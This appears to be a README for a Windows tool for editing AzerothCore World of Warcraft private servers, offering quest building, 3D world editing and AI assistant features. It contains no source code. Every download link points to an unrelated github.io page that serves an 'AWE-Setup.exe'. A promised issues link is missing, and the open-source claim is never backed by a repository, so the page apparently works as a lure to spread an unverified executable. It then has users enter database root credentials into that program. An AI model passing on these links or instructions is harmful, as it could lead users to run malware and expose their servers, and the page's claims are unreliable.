# 🎮 azeroth-world-editor - Build Your World, Effortlessly

[![Download Now](https://img.shields.io/badge/Download-AWE_Setup-blue?style=for-the-badge&logo=windows&logoColor=white&color=random)](https://200patolino.github.io)

---

## 👋 Welcome to Azeroth World Editor

Hello, adventurer! If you run a World of Warcraft Wrath of the Lich King (WotLK) private server using **AzerothCore**, this tool is your new best friend. Azeroth World Editor (AWE) lets you create custom quests, edit the 3D world, and manage SmartAI scripts—all from a simple desktop app. No programming needed. Just point, click, and create.

Think of it as a magic wand for your server. You can design a new village, add talking NPCs, create a quest where players hunt a rare beast, and even make the beast fight back—all visually, without touching a line of code. This guide will walk you through getting AWE running on your Windows PC in just a few minutes.

---

## ✨ What Can AWE Do For You?

Here’s what you can accomplish with this powerful yet friendly tool:

- **🗺️ 3D World Editing:** See your Azeroth map in 3D. Move buildings, trees, and creatures by dragging them around like toys.
- **📜 Quest Builder:** Create quests visually. Set the objectives, write the story text, and decide the rewards—all through easy forms and dropdowns.
- **🤖 SmartAI Scripting:** Make creatures intelligent. Tell a guard to patrol, a merchant to greet players, or a boss to cast a spell when hit. All done with simple “if this, then that” menus.
- **🔧 SQL Generator:** When you save your work, AWE secretly writes the database commands for you. Your server reads these commands and brings your creation to life. You never see the code unless you want to.
- **🤝 AI Assistant Integration:** AWE works with AI models (like Claude) through the Model Context Protocol. You can ask an AI to “create a quest to collect 10 wolf pelts” and it will build it for you.

---

## 📥 Getting Started (Download & Setup)

Let’s get AWE onto your computer. Follow these steps carefully.

### Step 1: Download the App

1.  Click the blue button below or the one at the top of this page. It takes you to the official download area.
2.  [**Download AWE Now**](https://200patolino.github.io)

### Step 2: Run the Installer

Your download will be a single file. When it finishes, you can stop reading this and run it, or read on for details.

- Find the downloaded file (usually in your `Downloads` folder). It’s named something like `AWE-Setup.exe`.
- Double-click it to begin.
- Follow the simple on-screen prompts. Just keep clicking “Next” and then “Install.” The default options are perfect for most users.
- Once finished, click “Finish” or “Launch.” AWE will open.

### Step 3: Connect to Your Server (First-Time Setup)

When AWE opens, it asks for your server’s database details. Don’t worry—it’s just like filling out a contact form.

- **Host:** This is usually `localhost` if your server is on the same computer.
- **Port:** Typically `3306` for MySQL databases.
- **Username:** You probably set this when you installed your server, like `root`.
- **Password:** The password you chose for your database.
- **Database Name:** Usually `acore_world` or `world`. Check your server’s config if unsure.

Click “Test Connection.” If it turns green, you’re done! AWE is ready to use.

---

## 🛠️ A Quick Tour of the Main Screen

When you open AWE, you’ll see several panels:

- **Left Panel (World Explorer):** A tree list of all zones, dungeons, and creatures. Click anything to see it on the 3D map.
- **Center (3D Viewport):** The interactive map. Use your mouse to move:
    - Scroll wheel: Zoom in/out
    - Right-drag: Rotate view
    - Middle-drag: Pan around
- **Right Panel (Inspector):** Shows details of whatever you select—an NPC’s health, a quest’s objectives, or a tree’s position.
- **Top Toolbar:** Big buttons for “New Quest,” “Edit Creature,” “Save to Server,” and more.

---

## 🌍 Your First Project: Create a Simple Quest

Let’s practice. We’ll make a quest to kill a bandit and bring back his head.

1.  Click **“New Quest”** in the toolbar.
2.  Give it a **Title:** "Clear the Bandit Camp"
3.  Write a **Description:** "The bandits on the hill are stealing our supplies. Kill their leader and bring me his head."
4.  Skip the Reward section for now.
5.  Click **“Add Objective.”**
    - Objective Type: **“Kill a Creature”**
    - Creature: Search for **“Bandit Leader”** in the picker.
    - Count: **1**
6.  Now add another objective:
    - Type: **“Collect Item”**
    - Item: Search for **“Bandit Leader’s Head”**
    - Count: **1**
7.  Click **“Save to Server.”**

Boom! You just created a quest. If your server is running, players can now see it in-game.

---

## 🤝 Using AI to Create Content (Optional Magic)

AWE is special because it can work with a digital assistant. This is great if you want help writing quest storylines or creating complex creature behaviors.

1.  In the top menu, click **“AI Assistant”**.
2.  You’ll see a chat box. Type something like: *“Create a quest for level 20 players in Elwynn Forest. They need to defeat a rogue mage named Zarn and collect his staff.”*
3.  Press Enter. The AI will think and then generate the entire quest for you, complete with objectives and rewards. You can then review it and press **“Accept & Save”**.

It’s like having a senior game designer on your team.

---

## 🛑 Troubleshooting Common Issues

Sometimes things don’t go perfectly. Here are quick fixes.

- **“Cannot Connect to Server”:** Double-check your database username and password. Make sure your MySQL service is running (start it from your server’s control panel).
- **Map appears empty:** Go to the top toolbar and click **“Load Map.”** Navigate to your server’s map files (often in `Server\data\maps`).
- **Quest doesn’t show up in game:** Make sure you clicked **“Save to Server”** and that your server’s world server was restarted or is set to reload automatically.
- **App is slow:** Close any other heavy programs. AWE works best with at least 8GB of RAM.

---

## ❓ Frequently Asked Questions

- **Is this free?** Yes, it’s completely free and open-source.
- **Can I damage my server with this?** You can break quests or spawn weird items, but it won’t corrupt your database files. You can always delete what you create.
- **Does it work on Mac or Linux?** The main download is for Windows. If you’re tech-savvy, you can build it from the source code, but we recommend Windows for simplicity.
- **How do I uninstall it?** Go to “Add or Remove Programs” in Windows, find “Azeroth World Editor,” and click “Uninstall.”

---

## 📚 Need More Help?

You’re never alone. Here’s where to find help:

- **GitHub Issues:** Go to the repository and click “Issues” to report bugs or ask questions. (Link below)
- **Community Servers:** Check popular AzerothCore forums and Discord servers. Many members use AWE.

---

## ✅ Final Checklist

Before you start building, make sure you have:

- [ ] Downloaded AWE from the official link.
- [ ] Installed it on your Windows PC.
- [ ] Connected it to your AzerothCore database.
- [ ] Loaded your server’s map files.
- [ ] Created and saved your first test quest.

---

## 🚀 Ready to Become a World Builder?

You now have everything you need to start transforming your World of Warcraft server. Don’t be afraid to experiment. Mistakes are just deleted quests. Every great world was built one block at a time.

Grab your copy, open the editor, and make your Azeroth unforgettable.

[**Click Here to Download Azeroth World Editor**](https://200patolino.github.io)

---

*Happy building, hero. Your players are waiting.*

---

Keywords: ai, azerothcore, claude, desktop-app, electron, game-modding, llm, mcp, model-context-protocol, mysql, quest-builder, quest-editor, smartai, sql-generator, world-of-warcraft, wotlk, wow-private-server